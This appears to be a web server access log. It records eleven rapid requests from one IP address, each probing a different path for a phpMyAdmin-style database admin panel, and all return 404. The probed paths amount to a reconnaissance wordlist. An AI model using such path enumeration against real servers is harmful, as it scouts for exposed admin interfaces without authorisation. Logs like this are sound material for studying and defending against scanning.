::ffff:46.10.161.235 - - [08/Sep/2022:13:23:52 +0000] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:46.10.161.235 - - [08/Sep/2022:13:23:52 +0000] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:46.10.161.235 - - [08/Sep/2022:13:23:52 +0000] "GET /db/dbweb/index.php?lang=en HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:46.10.161.235 - - [08/Sep/2022:13:23:53 +0000] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:46.10.161.235 - - [08/Sep/2022:13:23:53 +0000] "GET /db/dbadmin/index.php?lang=en HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:46.10.161.235 - - [08/Sep/2022:13:23:53 +0000] "GET /dbadmin/index.php?lang=en HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:46.10.161.235 - - [08/Sep/2022:13:23:53 +0000] "GET /sql/sqlweb/index.php?lang=en HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:46.10.161.235 - - [08/Sep/2022:13:23:53 +0000] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:46.10.161.235 - - [08/Sep/2022:13:23:54 +0000] "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1" 404 164 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:46.10.161.235 - - [08/Sep/2022:13:23:54 +0000] "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.1" 404 164 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:46.10.161.235 - - [08/Sep/2022:13:23:54 +0000] "GET /mysqlmanager/index.php?lang=en HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
